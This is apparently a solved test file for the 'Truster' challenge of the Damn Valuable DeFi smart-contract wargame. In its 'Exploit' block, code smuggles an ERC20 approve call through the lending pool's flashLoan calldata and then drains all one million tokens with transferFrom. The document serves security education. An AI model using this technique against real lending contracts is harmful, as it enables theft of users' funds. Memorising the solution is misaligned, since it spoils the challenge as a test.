const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
    const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await this.token.balanceOf(attacker.address)).to.equal('0');
  });

  it('Exploit', async function () {
    // let abi = ['function approve(address spender,uint256 amount)'];
    // let iface = new ethers.utils.Interface(abi);
    // let data = iface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
    const data = await (
      await ethers.getContractFactory('DamnValuableToken')
    ).interface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
    await this.pool.flashLoan(0, attacker.address, this.token.address, data);
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    /** CODE YOUR EXPLOIT HERE  */
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await this.token.balanceOf(this.pool.address)).to.equal('0');
  });
});
